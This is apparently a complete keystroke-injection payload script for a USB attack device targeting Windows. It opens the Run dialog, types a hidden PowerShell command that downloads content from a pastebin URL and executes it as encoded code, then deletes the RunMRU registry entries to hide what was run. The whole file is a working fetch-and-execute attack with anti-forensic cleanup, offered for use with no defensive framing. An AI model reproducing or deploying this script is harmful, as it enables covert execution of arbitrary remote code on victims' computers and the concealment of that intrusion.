layout('us');
typingSpeed(0,0);

waitLEDRepeat(CAPS);
press("GUI r");
delay(150);
type('powershell -windowstyle hidden $u='https://pastebin.com/raw/YOUR LINK';$r=Invoke-WebRequest -Uri $u;powershell -nop -e $r.content\n');
delay(150);
press("GUI r");
delay(150);
type('powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"\n');
